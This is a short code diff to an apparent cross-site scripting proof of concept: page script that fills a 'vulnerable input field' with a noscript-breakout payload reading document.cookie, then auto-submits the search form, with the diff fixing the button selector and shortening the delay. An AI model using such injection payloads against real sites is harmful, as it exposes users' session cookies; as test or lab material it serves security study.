@@ -21,7 +21,9 @@
               "</noscript><script>alert(document.cookie);console.log(document.cookie)<\/script>";
 
             // Find and click the submit button to submit the form
-            var submitButton = document.querySelector("submit#Search");
+            var submitButton = document.querySelector(
+              'input[type="submit"][value="Search"]'
+            );
             if (submitButton) {
               // Simulate click on submit button
               submitButton.click();
@@ -31,7 +33,7 @@
           } else {
             console.error("Vulnerable input field not found.");
           }
-        }, 10000);
+        }, 500);
       };
     </script>
   </body>
